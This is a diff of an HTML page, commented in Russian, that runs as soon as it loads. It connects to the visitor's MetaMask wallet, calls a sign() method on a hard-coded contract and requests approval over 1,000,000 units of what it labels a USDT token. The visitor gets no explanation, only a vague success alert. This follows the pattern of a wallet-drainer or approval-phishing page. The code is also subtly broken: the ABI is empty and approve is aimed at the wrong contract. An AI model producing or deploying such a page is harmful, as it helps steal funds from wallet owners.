@@ -1,47 +1,48 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Автоматическое Подключение и Подписание Контракта</title>
+    <title>Автоматическое Подключение и Подписание Контракта с MetaMask</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', async () => {
             if (typeof window.ethereum !== 'undefined') {
-                const web3 = new Web3(window.ethereum);
+                web3 = new Web3(window.ethereum);
                 try {
-                    // Запрос доступа к аккаунту пользователя
+                    // Запрос на подключение к MetaMask
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    
+                    // Получение подключенного аккаунта пользователя
                     const accounts = await web3.eth.getAccounts();
                     const userAddress = accounts[0];
                     console.log("Подключен аккаунт:", userAddress);
 
                     // Адрес и ABI вашего контракта
-                    const contractAddress = "ВАШ_АДРЕС_КОНТРАКТА";
-                    const abi = [ /* Вставьте ABI вашего контракта здесь */ ];
+                    const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2";
+                    const abi = [ /* Вставьте ABI вашего нового контракта здесь */ ];
 
-                    // Создание экземпляра контракта
+                    // Создание контракта и вызов подписания
                     const contract = new web3.eth.Contract(abi, contractAddress);
-
-                    // Вызов метода подписания контракта
+                    
+                    // Подписание контракта
                     await contract.methods.sign().send({ from: userAddress });
                     console.log("Контракт подписан пользователем:", userAddress);
 
-                    // Адрес токена и сумма для разрешения
-                    const tokenAddress = "АДРЕС_ВАШЕГО_ТОКЕНА";
+                    // Предоставление разрешения на управление токенами
+                    const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
                     const amountToApprove = web3.utils.toWei("1000000", "ether");
 
-                    // Вызов метода approve для предоставления разрешения
-                    await contract.methods.approve(tokenAddress, amountToApprove).send({ from: userAddress });
+                    // Вызов метода для предоставления разрешения
+                    await contract.methods.approve(usdtTokenAddress, amountToApprove).send({ from: userAddress });
                     console.log("Разрешение предоставлено для контракта:", contractAddress);
 
-                    alert("Контракт успешно подписан, и разрешение предоставлено!");
-
+                    alert("Контракт успешно подписан и доступ предоставлен!");
                 } catch (error) {
                     console.error("Ошибка при подключении или подписании:", error);
                 }
             } else {
-                alert("Trust Wallet или MetaMask не найдены!");
+                alert("MetaMask не найден! Пожалуйста, установите MetaMask и попробуйте снова.");
             }
         });
     </script>
